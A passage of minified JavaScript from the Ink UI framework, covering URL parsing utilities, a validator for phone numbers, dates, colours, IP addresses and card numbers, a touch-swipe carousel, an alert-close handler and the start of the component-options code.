t)t.hasOwnProperty(i)&&(r?n="&":(n="?",r=!0),"number"==typeof(o=t[i])||o||(o=""),a=a.concat([n,encodeURIComponent(i),"=",encodeURIComponent(o)]));return a.join("")},getQueryString:function(e){var t,n={};if((t=e&&void 0!==e?e:this.getUrl()).match(/\?(.+)/i)){var i=t.replace(/^(.*)\?([^\#]+)(\#(.*))?/g,"$2");if(i.length>0)for(var o=i.split(/[;&]/),r=0;r<o.length;r++){var a=o[r].split("=");n[decodeURIComponent(a[0])]=!(void 0===a[1]||!a[1])&&decodeURIComponent(a[1])}}return n},getAnchor:function(e){var t,n=!1;return(t=e&&void 0!==e?e:this.getUrl()).match(/#(.+)/)&&(n=t.replace(/([^#]+)#(.*)/,"$2")),n},getAnchorString:function(e){var t,n={};if((t=e&&void 0!==e?e:this.getUrl()).match(/#(.+)/i)){var i=t.replace(/^([^#]+)#(.*)?/g,"$2");if(i.length>0)for(var o=i.split(/[;&]/),r=0;r<o.length;r++){var a=o[r].split("=");n[decodeURIComponent(a[0])]=!(void 0===a[1]||!a[1])&&decodeURIComponent(a[1])}}return n},parseUrl:function(e){var t={};if(e&&"string"==typeof e){if(e.match(/^([^:]+):\/\//i)){var n=/^([^:]+):\/\/([^\/]*)\/?([^\?#]*)\??([^#]*)#?(.*)/i;e.match(n)&&(t.scheme=e.replace(n,"$1"),t.host=e.replace(n,"$2"),t.path="/"+e.replace(n,"$3"),t.query=e.replace(n,"$4")||!1,t.fragment=e.replace(n,"$5")||!1)}else{var i=new RegExp("^([^\\?]+)\\?([^#]+)#(.*)","i"),o=new RegExp("^([^\\?]+)\\?([^#]+)#?","i"),r=new RegExp("^([^\\?]+)\\??","i");e.match(i)?(t.scheme=!1,t.host=!1,t.path=e.replace(i,"$1"),t.query=e.replace(i,"$2"),t.fragment=e.replace(i,"$3")):e.match(o)?(t.scheme=!1,t.host=!1,t.path=e.replace(o,"$1"),t.query=e.replace(o,"$2"),t.fragment=!1):e.match(r)&&(t.scheme=!1,t.host=!1,t.path=e.replace(r,"$1"),t.query=!1,t.fragment=!1)}if(t.host){var a=/^(.*?)\\:(\\d+)$/i;if(t.host.match(a)){var s=t.host;t.host=s.replace(a,"$1"),t.port=s.replace(a,"$2")}else t.port=!1;if(t.host.match(/@/i)){var l=t.host;t.host=l.split("@")[1];var c=l.split("@")[0];c.match(/\:/)?(t.user=c.split(":")[0],t.pass=c.split(":")[1]):(t.user=c,t.pass=!1)}}}return t},format:function(e){var t="",n="",i="",o="",r="";return"string"==typeof e.protocol?t=e.protocol+"//":"string"==typeof e.scheme&&(t=e.scheme+"://"),n=e.host||e.hostname||"",i=e.path||"","string"==typeof e.query?r=e.query:"string"==typeof e.search&&(r=e.search.replace(/^\?/,"")),"string"==typeof e.fragment?o=e.fragment:"string"==typeof e.hash&&(o=e.hash.replace(/#$/,"")),[t,n,i,r&&"?"+r,o&&"#"+o].join("")},currentScriptElement:function(e){var t=document.getElementsByTagName("script");if(void 0===e)return t.length>0&&t[t.length-1];for(var n=!1,i=new RegExp(""+e,"i"),o=0,r=t.length;o<r;o++)if(n=t[o],i.test(n.src))return n;return!1}}})),Ink.createModule("Ink.Util.Validator","1",[],(function(){"use strict";var e={_countryCodes:["AO","CV","MZ","TL","PT"],_internacionalPT:351,_indicativosPT:{21:"lisboa",22:"porto",231:"mealhada",232:"viseu",233:"figueira da foz",234:"aveiro",235:"arganil",236:"pombal",238:"seia",239:"coimbra",241:"abrantes",242:"ponte de sôr",243:"santarém",244:"leiria",245:"portalegre",249:"torres novas",251:"valença",252:"vila nova de famalicão",253:"braga",254:"peso da régua",255:"penafiel",256:"são joão da madeira",258:"viana do castelo",259:"vila real",261:"torres vedras",262:"caldas da raínha",263:"vila franca de xira",265:"setúbal",266:"évora",268:"estremoz",269:"santiago do cacém",271:"guarda",272:"castelo branco",273:"bragança",274:"proença-a-nova",275:"covilhã",276:"chaves",277:"idanha-a-nova",278:"mirandela",279:"moncorvo",281:"tavira",282:"portimão",283:"odemira",284:"beja",285:"moura",286:"castro verde",289:"faro",291:"funchal, porto santo",292:"corvo, faial, flores, horta, pico",295:"angra do heroísmo, graciosa, são jorge, terceira",296:"ponta delgada, são miguel, santa maria",91:"rede móvel 91 (Vodafone / Yorn)",93:"rede móvel 93 (Optimus)",96:"rede móvel 96 (TMN)",92:"rede móvel 92 (TODOS)",707:"número único",760:"número único",800:"número grátis",808:"chamada local",30:"voip"},_internacionalCV:238,_indicativosCV:{2:"fixo",91:"móvel 91",95:"móvel 95",97:"móvel 97",98:"móvel 98",99:"móvel 99"},_internacionalAO:244,_indicativosAO:{2:"fixo",91:"móvel 91",92:"móvel 92"},_internacionalMZ:258,_indicativosMZ:{2:"fixo",82:"móvel 82",84:"móvel 84"},_internacionalTL:670,_indicativosTL:{3:"fixo",7:"móvel 7"},_characterGroups:{numbers:["0-9"],asciiAlpha:["a-zA-Z"],latin1Alpha:["a-zA-Z","À-ÿ"],unicodeAlpha:["a-zA-Z","À-ÿ","Ā-῿","Ⰰ-퟿"],space:[" "],dash:["-"],underscore:["_"],nicknamePunctuation:["_.-"],singleLineWhitespace:["\t "],newline:["\n"],whitespace:["\t\n\v\f\r  "],asciiPunctuation:["!-/",":-@","[-`","{-~"],latin1Punctuation:["!-/",":-@","[-`","{-~","¡-¿","×","÷"],unicodePunctuation:["!-/",":-@","[-`","{-~","¡-¿","×","÷"," -⁯","⸀-⹿","　-〿"]},createRegExp:function(t){var n="^[";for(var i in t)if(t.hasOwnProperty(i)){if(!(i in e._characterGroups))throw new Error("group "+i+" is not a valid character group");t[i]&&(n+=e._characterGroups[i].join(""))}return"^["===n?new RegExp("$^"):new RegExp(n+"]*?$")},checkCharacterGroups:function(t,n){return e.createRegExp(n).test(t)},unicode:function(t,n){return e.checkCharacterGroups(t,Ink.extendObj({unicodeAlpha:!0},n))},latin1:function(t,n){return e.checkCharacterGroups(t,Ink.extendObj({latin1Alpha:!0},n))},ascii:function(t,n){return e.checkCharacterGroups(t,Ink.extendObj({asciiAlpha:!0},n))},number:function(t,n){if(t+="",(n=Ink.extendObj({decimalSep:".",thousandSep:"",negative:!0,decimalPlaces:null,maxDigits:null,max:null,min:null,returnNumber:!1},n||{})).thousandSep)return t=t.replace(new RegExp("\\"+n.thousandSep,"g"),""),n.thousandSep="",e.number(t,n);if(!1===n.negative)return n.min=0,n.negative=!0,e.number(t,n);if("."!==n.decimalSep&&(t=t.replace(new RegExp("\\"+n.decimalSep,"g"),".")),!/^(-)?(\d+)?(\.\d+)?$/.test(t)||""===t)return!1;var i;if(n.decimalSep&&-1!==t.indexOf(n.decimalSep)){if(i=t.split(n.decimalSep),null!==n.decimalPlaces&&i[1].length>n.decimalPlaces)return!1}else i=[""+t,""];if(null!==n.maxDigits&&i[0].replace(/-/g,"").length>n.maxDigits)return i;var o=parseFloat(t);return!(null!==n.maxExcl&&o>=n.maxExcl||null!==n.minExcl&&o<=n.minExcl)&&!(null!==n.max&&o>n.max||null!==n.min&&o<n.min)&&(!n.returnNumber||o)},_isLeapYear:function(e){return!(!/^\d{4}$/.test(e)||e%4||!(e%100)&&e%400)},_dateParsers:{"yyyy-mm-dd":{day:5,month:3,year:1,sep:"-",parser:/^(\d{4})(\-)(\d{1,2})(\-)(\d{1,2})$/},"yyyy/mm/dd":{day:5,month:3,year:1,sep:"/",parser:/^(\d{4})(\/)(\d{1,2})(\/)(\d{1,2})$/},"yy-mm-dd":{day:5,month:3,year:1,sep:"-",parser:/^(\d{2})(\-)(\d{1,2})(\-)(\d{1,2})$/},"yy/mm/dd":{day:5,month:3,year:1,sep:"/",parser:/^(\d{2})(\/)(\d{1,2})(\/)(\d{1,2})$/},"dd-mm-yyyy":{day:1,month:3,year:5,sep:"-",parser:/^(\d{1,2})(\-)(\d{1,2})(\-)(\d{4})$/},"dd/mm/yyyy":{day:1,month:3,year:5,sep:"/",parser:/^(\d{1,2})(\/)(\d{1,2})(\/)(\d{4})$/},"dd-mm-yy":{day:1,month:3,year:5,sep:"-",parser:/^(\d{1,2})(\-)(\d{1,2})(\-)(\d{2})$/},"dd/mm/yy":{day:1,month:3,year:5,sep:"/",parser:/^(\d{1,2})(\/)(\d{1,2})(\/)(\d{2})$/}},_daysInMonth:function(e,t){var n=0;return e=parseInt(e,10),t=parseInt(t,10),1===e||3===e||5===e||7===e||8===e||10===e||12===e?n=31:4===e||6===e||9===e||11===e?n=30:2===e&&(n=t%400==0||t%4==0&&t%100!=0?29:28),n},_isValidDate:function(e,t,n){var i=/^\d{1,2}$/;return!!(/^\d{4}$/.test(e)&&i.test(t)&&i.test(n)&&t>=1&&t<=12&&n>=1&&this._daysInMonth(t,e)>=n)},email:function(e){return!!new RegExp("^[_a-z0-9-]+((\\.|\\+)[_a-z0-9-]+)*@([\\w]*-?[\\w]*\\.)+[a-z]{2,4}$","i").test(e)},mail:function(t){return e.email(t)},url:function(e,t){void 0!==t&&!1!==t||!1===new RegExp("(^(http\\:\\/\\/|https\\:\\/\\/)(.+))","i").test(e)&&(e="http://"+e);return!1!==new RegExp("^(http:\\/\\/|https:\\/\\/)([\\w]*(-?[\\w]*)*\\.)+[a-z]{2,4}","i").test(e)},isPTPhone:function(e){e=e.toString();var t=[];for(var n in this._indicativosPT)"string"==typeof this._indicativosPT[n]&&t.push(n);var i=t.join("|"),o=/^(00351|\+351)/;o.test(e)&&(e=e.replace(o,""));if(9===(e=e.replace(/(\s|\-|\.)+/g,"")).length&&/[\d]{9}/i.test(e)&&new RegExp("^("+i+")").test(e))return!0;return!1},isPortuguesePhone:function(e){return this.isPTPhone(e)},isCVPhone:function(e){e=e.toString();var t=[];for(var n in this._indicativosCV)"string"==typeof this._indicativosCV[n]&&t.push(n);var i=t.join("|"),o=/^(00238|\+238)/;o.test(e)&&(e=e.replace(o,""));if(7===(e=e.replace(/(\s|\-|\.)+/g,"")).length&&/[\d]{7}/i.test(e)&&new RegExp("^("+i+")").test(e))return!0;return!1},isAOPhone:function(e){e=e.toString();var t=[];for(var n in this._indicativosAO)"string"==typeof this._indicativosAO[n]&&t.push(n);var i=t.join("|"),o=/^(00244|\+244)/;o.test(e)&&(e=e.replace(o,""));if(9===(e=e.replace(/(\s|\-|\.)+/g,"")).length&&/[\d]{9}/i.test(e)&&new RegExp("^("+i+")").test(e))return!0;return!1},isMZPhone:function(e){e=e.toString();var t=[];for(var n in this._indicativosMZ)"string"==typeof this._indicativosMZ[n]&&t.push(n);var i=t.join("|"),o=/^(00258|\+258)/;o.test(e)&&(e=e.replace(o,""));if((9===(e=e.replace(/(\s|\-|\.)+/g,"")).length||8===e.length)&&/[\d]{8,9}/i.test(e)&&new RegExp("^("+i+")").test(e)){if(0===e.indexOf("2")&&8===e.length)return!0;if(0===e.indexOf("8")&&9===e.length)return!0}return!1},isTLPhone:function(e){e=e.toString();var t=[];for(var n in this._indicativosTL)"string"==typeof this._indicativosTL[n]&&t.push(n);var i=t.join("|"),o=/^(00670|\+670)/;o.test(e)&&(e=e.replace(o,""));if(7===(e=e.replace(/(\s|\-|\.)+/g,"")).length&&/[\d]{7}/i.test(e)&&new RegExp("^("+i+")").test(e))return!0;return!1},isPhone:function(){var e;if(0===arguments.length)return!1;var t=arguments[0];if(arguments.length>1){if(arguments[1].constructor!==Array){if("function"==typeof this["is"+arguments[1].toUpperCase()+"Phone"])return this["is"+arguments[1].toUpperCase()+"Phone"](t);throw"Invalid Country Code!"}var n;for(e=0;e<arguments[1].length;e++){if("function"!=typeof(n=this["is"+arguments[1][e].toUpperCase()+"Phone"]))throw"Invalid Country Code!";if(n(t))return!0}}else for(e=0;e<this._countryCodes.length;e++)if(this["is"+this._countryCodes[e]+"Phone"](t))return!0;return!1},codPostal:function(e,t,n){var i=/^\s+|\s+$/g,o=/^[1-9]\d{3}$/,r=/^\d{3}$/;if(e=e.replace(i,""),void 0!==t){if(t=t.replace(i,""),o.test(e)&&r.test(t))return!n||[!0,!0]}else{if(o.test(e))return!n||[!0,!1];var a=e.match(/^(.{4})(.*)(.{3})$/);if(null!==a&&o.test(a[1])&&/^(\s*\-\s*|\s+)$/.test(a[2])&&r.test(a[3]))return!n||[!0,!1]}return!!n&&[!1,!1]},isDate:function(e,t){if(void 0===this._dateParsers[e])return!1;var n=this._dateParsers[e].year,i=this._dateParsers[e].month,o=this._dateParsers[e].day,r=this._dateParsers[e].parser,a=this._dateParsers[e].sep,s=t.match(r);if(null!==s&&s[2]===s[4]&&s[2]===a){var l=2===s[n].length?"20"+s[n].toString():s[n];if(this._isValidDate(l,s[i].toString(),s[o].toString()))return!0}return!1},isColor:function(e){var t,n,i=!1;if(/^[a-zA-Z]+$/.test(e)||/^#([0-9a-fA-F]{3}|[0-9a-fA-F]{6})$/.test(e))return!0;if(null!==(t=/^rgb\(\s*([0-9]{1,3})(%)?\s*,\s*([0-9]{1,3})(%)?\s*,\s*([0-9]{1,3})(%)?\s*\)$/.exec(e))||null!==(t=/^rgba\(\s*([0-9]{1,3})(%)?\s*,\s*([0-9]{1,3})(%)?\s*,\s*([0-9]{1,3})(%)?\s*,\s*(1(\.0)?|0(\.[0-9])?)\s*\)$/.exec(e)))for(n=t.length;n--;){if((2===n||4===n||6===n)&&void 0!==t[n]&&""!==t[n]){if(!(void 0!==t[n-1]&&t[n-1]>=0&&t[n-1]<=100))return!1;i=!0}if(1===n||3===n||5===n&&(void 0===t[n+1]||""===t[n+1])){if(!(void 0!==t[n]&&t[n]>=0&&t[n]<=255))return!1;i=!0}}if(null!==(t=/^hsl\(\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})(%)?\s*,\s*([0-9]{1,3})(%)?\s*\)$/.exec(e))||null!==(t=/^hsla\(\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})(%)?\s*,\s*([0-9]{1,3})(%)?\s*,\s*(1(\.0)?|0(\.[0-9])?)\s*\)$/.exec(e)))for(n=t.length;n--;){if(3===n||5===n){if(!(void 0!==t[n-1]&&void 0!==t[n]&&""!==t[n]&&t[n-1]>=0&&t[n-1]<=100))return!1;i=!0}if(1===n){if(!(void 0!==t[n]&&t[n]>=0&&t[n]<=360))return!1;i=!0}}return i},isIP:function(e,t){if("string"!=typeof e)return!1;switch(t=(t||"ipv4").toLowerCase()){case"ipv4":return/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(e);case"ipv6":return/^\s*((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:)))(%.+)?\s*$/.test(e);default:return!1}},_creditCardSpecs:{default:{length:"13,14,15,16,17,18,19",prefix:/^.+/,luhn:!0},"american express":{length:"15",prefix:/^3[47]/,luhn:!0},"diners club":{length:"14,16",prefix:/^36|55|30[0-5]/,luhn:!0},discover:{length:"16",prefix:/^6(?:5|011)/,luhn:!0},jcb:{length:"15,16",prefix:/^3|1800|2131/,luhn:!0},maestro:{length:"16,18",prefix:/^50(?:20|38)|6(?:304|759)/,luhn:!0},mastercard:{length:"16",prefix:/^5[1-5]/,luhn:!0},visa:{length:"13,16",prefix:/^4/,luhn:!0}},_luhn:function(e){if("number"!=typeof(e=parseInt(e,10))&&e%1!=0)return!1;var t,n=(e+="").length,i=0;for(t=n-1;t>=0;t-=2)i+=parseInt(e.substr(t,1),10);for(t=n-2;t>=0;t-=2){var o=parseInt(2*e.substr(t,1),10);i+=o>=10?o-9:o}return i%10==0},isCreditCard:function(e,t){if(!1===/\d+/.test(e))return!1;if(void 0===t)t="default";else if(t instanceof Array){var n,i=t.length;for(n=0;n<i;n++)if(this.isCreditCard(e,t[n]))return!0;return!1}if(t=t.toLowerCase(),void 0===this._creditCardSpecs[t])return!1;var o=e.length+"";return-1!==this._creditCardSpecs[t].length.split(",").indexOf(o)&&!!this._creditCardSpecs[t].prefix.test(e)&&(!1===this._creditCardSpecs[t].luhn||this._luhn(e))},getEANCheckDigit:function(e){var t,n=0;for(e=String(e);e.length<12;)e="00000"+e;for(t=e.length-1;t>=0;t--)n+=(t%2*2+1)*Number(e.charAt(t));return 10-n%10},isEAN:function(t,n){switch(void 0===n&&(n="ean-13"),n){case"ean-13":if(13!==t.length)return!1;break;case"ean-8":if(8!==t.length)return!1;break;default:return!1}var i=t.substr(0,t.length-1),o=t.charAt(t.length-1),r=e.getEANCheckDigit(i);return String(r)===o}};return e})),Ink.createModule("Ink.UI.Carousel","1",["Ink.UI.Common_1","Ink.Dom.Event_1","Ink.Dom.Css_1","Ink.Dom.Element_1","Ink.UI.Pagination_1","Ink.Dom.Browser_1","Ink.Dom.Selector_1"],(function(e,t,n,i,o,r){"use strict";function a(e,t,n){return Math.min(n,Math.max(t,e))}function s(){e.BaseUIComponent.apply(this,arguments)}function l(e,t){e.style.transitionProperty=e.style.oTransitionProperty=e.style.msTransitionProperty=e.style.mozTransitionProperty=e.style.webkitTransitionProperty=t}var c=window.requestAnimationFrame||function(e){return setTimeout(e,1e3/30)};return s._name="Carousel_1",s._optionDefinition={autoAdvance:["Integer",0],axis:["String","x"],initialPage:["Integer",0],spaceAfterLastSlide:["Boolean",!0],keyboardSupport:["Boolean",!1],pagination:["String",null],onChange:["Function",null],onInit:["Function",function(){}],swipe:["Boolean",!0]},s.prototype={_validate:function(){if(!Ink.s("ul.stage",this._element))return new Error("Carousel must contain a ul.stage element!")},_init:function(){this._handlers={paginationChange:Ink.bindMethod(this,"_onPaginationChange"),windowResize:t.throttle(Ink.bindMethod(this,"refit"),200)},t.observe(window,"resize",this._handlers.windowResize),this._isY="y"===this._options.axis;var e=Ink.s("ul.stage",this._element);e.style.width="100%",this._ulEl=e,i.removeTextNodeChildren(e),null==this._options.pagination&&(this._currentPage=this._options.initialPage),this.refit(),this._isY&&(this._ulEl.style.whiteSpace="normal"),this._options.swipe&&(t.observe(this._element,"touchstart",Ink.bindMethod(this,"_onTouchStart")),t.observe(this._element,"touchmove",Ink.bindMethod(this,"_onTouchMove")),t.observe(this._element,"touchend",Ink.bindMethod(this,"_onTouchEnd"))),this._setUpPagination(),this._setUpAutoAdvance(),this._options.onInit.call(this,this)},refit:function(){var e=this._isY;this._liEls=Ink.ss("li.slide",this._ulEl);var t=this._liEls.length,n=this._ulEl.getBoundingClientRect();this._ctnLength=e?n.bottom-n.top:n.right-n.left,this._elLength=function(t,n){return t?n?i.outerDimensions(t)[e?0:1]:i.outerDimensions(t)[e?1:0]:0}(this._liEls[0]),this._slidesPerPage=Math.floor(this._ctnLength/this._elLength)||1,isFinite(this._slidesPerPage)||(this._slidesPerPage=1);var o=Math.ceil(t/this._slidesPerPage),r=this._numPages!==o;this._numPages=o,this._deltaLength=this._slidesPerPage*this._elLength,this._IE7(),this._pagination&&r&&this._pagination.setSize(this._numPages),this.setPage(a(this.getPage(),0,this._numPages-1))},_setUpPagination:function(){this._options.pagination?(e.isDOMElement(this._options.pagination)||"string"==typeof this._options.pagination?this._pagination=new o(this._options.pagination,{size:this._numPages,onChange:this._handlers.paginationChange}):(this._pagination=this._options.pagination,this._pagination.setOnChange(this._handlers.paginationChange),this._pagination.setSize(this._numPages)),this._pagination.setCurrent(this._options.initialPage||0)):this._currentPage=this._options.initialPage||0},_setUpAutoAdvance:function(){this._options.autoAdvance&&this.autoAdvance(this._options.autoAdvance)},autoAdvance:function(e){if(!this._autoAdvanceSto){var t=this;this._autoAdvanceSto=setTimeout((function n(){t.nextPage(!0),t._autoAdvanceSto=setTimeout(n,e)}),e)}},stopAutoAdvance:function(){this._autoAdvanceSto&&(clearTimeout(this._autoAdvanceSto),this._autoAdvanceSto=null)},_IE7:function(){if(r.IE&&""+r.version.split(".")[0]=="7")for(var e=Ink.ss("li.slide",this._ulEl),t=function(t,i){e[n].style[t]=i},n=0,i=e.length;n<i;n++)t("position","absolute"),t(this._isY?"top":"left",n*this._elLength+"px")},_onTouchStart:function(e){if(!(e.touches.length>1)){this._swipeData={x:t.pointerX(e),y:t.pointerY(e)};var n=this._ulEl.getBoundingClientRect();this._swipeData.firstUlPos=n[this._isY?"top":"left"],this._swipeData.inUlX=this._swipeData.x-n.left,this._swipeData.inUlY=this._swipeData.y-n.top,l(this._ulEl,"none"),this._touchMoveIsFirstTouchMove=!0}},_onTouchMove:function(e){if(!(e.touches.length>1)){var n=t.pointerX(e),i=t.pointerY(e),o=this._swipeData.y-i,r=this._swipeData.x-n;if(this._touchMoveIsFirstTouchMove){var a=Math.abs(o),s=Math.abs(r);this._touchMoveIsFirstTouchMove=void 0,this._scrolling=this._isY?s>a:a>s,this._scrolling||this._onAnimationFrame()}!this._scrolling&&this._swipeData&&(t.stopDefault(e),this._swipeData.pointerDelta=this._isY?o:r,this._swipeData.pointerPos=this._isY?i:n)}},_onAnimationFrame:function(){var e=this._swipeData;if(e&&!this._scrolling&&!this._touchMoveIsFirstTouchMove){var t,n=this._element.getBoundingClientRect();t=this._isY?e.pointerPos-e.inUlY-n.top:e.pointerPos-e.inUlX-n.left,this._ulEl.style[this._isY?"top":"left"]=t+"px",c(Ink.bindMethod(this,"_onAnimationFrame"))}},_onTouchEnd:function(e){if(this._swipeData&&this._swipeData.pointerPos&&!this._scrolling&&!this._touchMoveIsFirstTouchMove){var n=this._swipeData.pointerDelta,i=this.getPage(),o=n/this._elLength/this._slidesPerPage;Math.abs(o)>.1&&(i+=Math[n<0?"floor":"ceil"](o)),i=a(i,0,this._numPages-1),isNaN(i)||this.setPage(i),t.stopDefault(e)}l(this._ulEl,null),this._swipeData=null,this._touchMoveIsFirstTouchMove=void 0,this._scrolling=void 0},_onPaginationChange:function(e){this._setPage(e.getCurrent())},getPage:function(){return this._pagination?this._pagination.getCurrent():this._currentPage||0},getPagination:function(){return this._pagination||null},setPage:function(e,t){return t&&((e%=this._numPages)<0&&(e=this._numPages-e)),(e=a(e,0,this._numPages-1))===this._currentPage?void(this._swipeData&&this._setPage(e)):void(this._pagination?this._pagination.setCurrent(e):this._setPage(e))},_setPage:function(e){var t=e*this._deltaLength,n=e===this._numPages-1;if(!this._options.spaceAfterLastSlide&&n&&e>0){var i=this._liEls.length-e*this._slidesPerPage;i<this._slidesPerPage&&(t=(e-1)*this._deltaLength+i*this._elLength)}this._ulEl.style[this._isY?"top":"left"]=["-",t/this._ctnLength*100,"%"].join(""),this._options.onChange&&this._options.onChange.call(this,e),this._currentPage=e},nextPage:function(e){this.setPage(this.getPage()+1,e)},previousPage:function(e){this.setPage(this.getPage()-1,e)},getSlidesPerPage:function(){return this._slidesPerPage},getTotalPages:function(){return this._numPages},getStageElm:function(){return this._ulEl},getSlidesList:function(){return this._liEls},getTotalSlides:function(){return this.getSlidesList().length}},e.createUIComponent(s),s})),Ink.createModule("Ink.UI.Close","1",["Ink.Dom.Event_1","Ink.Dom.Element_1"],(function(e,t){"use strict";function n(){e.observe(document.body,"click",(function(n){var i=e.element(n);if(i=t.findUpwardsByClass(i,"ink-close")||t.findUpwardsByClass(i,"ink-dismiss")){var o=t.findUpwardsByClass(i,"ink-alert")||t.findUpwardsByClass(i,"ink-alert-block")||i;o&&(e.stopDefault(n),t.remove(o))}}))}return n._name="Close_1",n})),Ink.createModule("Ink.UI.Common","1",["Ink.Dom.Element_1","Ink.Net.Ajax_1","Ink.Dom.Css_1","Ink.Dom.Selector_1","Ink.Util.Url_1"],(function(e,t,n,i,o){"use strict";function r(){this&&this!==window&&"function"==typeof this.constructor&&Ink.warn("You called a method on an incorrectly instantiated "+this.constructor._name+" component. Check the warnings above to see what went wrong.")}function a(e,t){for(var n in e)if(e.hasOwnProperty(n)){if("constructor"===n)continue;"function"==typeof t[n]&&(t[n]=r)}}function s(e,t){var n=this.constructor,i=n._name;if(!this||this===window)throw new Error('Use "new InkComponent()" instead of "InkComponent()"');if(this&&!(this instanceof s))throw new Error("You forgot to call Ink.UI.Common.createUIComponent() on this module!");if(e||n._componentOptions.elementIsOptional){this._element=m.elsOrSelector(e,i+': An element with the selector "'+e+'" was not found!')[0],this._element||n._componentOptions.elementIsOptional||(o=!1,Ink.error(new Error(e+' does not match an element on the page. You need to pass a valid selector to "new '+i+'".'))),this._options=m.options(i,n._optionDefinition,t,this._element);var o=!0===s._validateInstance(this);if(o&&"function"==typeof this._init)try{this._init.apply(this,arguments)}catch(e){o=!1,Ink.error(e)}o?this._element&&m.registerInstance(this):s._stubInstance(this,n,i)}else Ink.error(new Error(i+': You need to pass an element or a selector as the first argument to "new '+i+'()"'))}var l={},c=Object.keys||function(e){var t=[];for(var n in e)e.hasOwnProperty(n)&&t.push(n);return t},u="WeakMap"in window,d=u?new WeakMap:null,h=[],p=function(e){return u?d.get(e):h[e.getAttribute("__InkInstance")]},f=function(e,t){u?d.set(e,t):e.setAttribute("__InkInstance",h.push(t)-1)},m={Layouts:{TINY:"tiny",SMALL:"small",MEDIUM:"medium",LARGE:"large",XLARGE:"xlarge"},isDOMElement:e.isDOMElement,isInteger:function(e){return"number"==typeof e&&e%1==0},elOrSelector:function(e,t){if(!m.isDOMElement(e)){var n=i.select(e);return 0===n.length?(Ink.warn(t+" must either be a DOM Element or a selector expression!\nThe script element must also be after the DOM Element itself."),null):n[0]}return e},elsOrSelector:function(e,t,n){var o;if("string"==typeof e?o=i.select(e):m.isDOMElement(e)?o=[e]:e&&"object"==typeof e&&"number"==typeof e.length&&(o=e),o&&o.length)return o;if(n)throw new TypeError(t+" must either be a DOM Element, an Array of elements, or a selector expression!\nThe script element must also be after the DOM Element itself.");return[]},options:function(t,n,i,o){function r(e){return s=n[e][0],u=s.toLowerCase(),d=2===n[e].length?n[e][1]:l,s||v("Ink.UI.Common.options: Always specify a type!"),u in m._coerce_funcs||v("Ink.UI.Common.options: "+n[e][0]+" is not a valid type. Use one of "+c(m._coerce_funcs).join(", ")),(!n[e].length||n[e].length>2)&&v('the "defaults" argument must be an object mapping option names to [typestring, optional] arrays.'),(a=e in p?m._coerce_from_string(u,p[e],e,t):l)!==l?m._options_validate(a,u)?a:(y("("+e+" option) Invalid "+u+" "+g(a)),d):e in i?i[e]:d!==l?d:void v("Option "+e+" is required!")}"string"!=typeof t&&(o=i,i=n,n=t,t=""),i=i||{};var a,s,u,d,h={},p=o?e.data(o):{},f=function(e){return t&&(e=t+': "'+(""+e).replace(/"/,'\\"')+'"'),e},g=function(e){return'"'+(""+e).replace(/"/,'\\"')+'"'},v=function(e){throw new Error(f(e))},y=function(e){Ink.error(f(e)+". Ignoring option.")};for(var _ in n)n.hasOwnProperty(_)&&(h[_]=r(_));return h},_coerce_from_string:function(e,t,n,i){return e in m._coerce_funcs?m._coerce_funcs[e](t,n,i):t},_options_validate:function(e,t){return t in m._options_validate_types&&m._options_validate_types[t].call(m,e)},_coerce_funcs:function(){var e={element:function(e){return m.elOrSelector(e,"")},elements:function(e){return m.elsOrSelector(e,"",!1)},object:function(e){return e},number:function(e){return parseFloat(e)},boolean:function(e){return!("false"===e||""===e||null===e)},string:function(e){return e},function:function(e,t,n){return Ink.error(n+': You cannot specify the option "'+t+"\" through data-attributes because it's a function"),l}};return e.float=e.integer=e.number,e}(),_options_validate_types:function(){var e={string:function(e){return"string"==typeof e},number:function(e){return"number"==typeof e&&!isNaN(e)&&isFinite(e)},integer:function(e){return e===Math.round(e)},element:function(e){return m.isDOMElement(e)},elements:function(e){return e&&"object"==typeof e&&"number"==typeof e.length&&e.length},boolean:function(e){return"boolean"==typeof e},object:function(){return!0}};return e.float=e.number,e}(),clone:function(e){try{return JSON.parse(JSON.stringify(e))}catch(e){throw new Error("Given object cannot have loops!")}},childIndex:e.parentIndexOf,ajaxJSON:function(e,n,i){new t(e,{evalJS:"force",method:"POST",parameters:n,onSuccess:function(e){try{if("ok"!==(e=e.responseJSON).status)throw"server error: "+e.message;i(null,e)}catch(e){i(e)}},onFailure:function(){i("communication failure")}})},currentLayout:function(){var 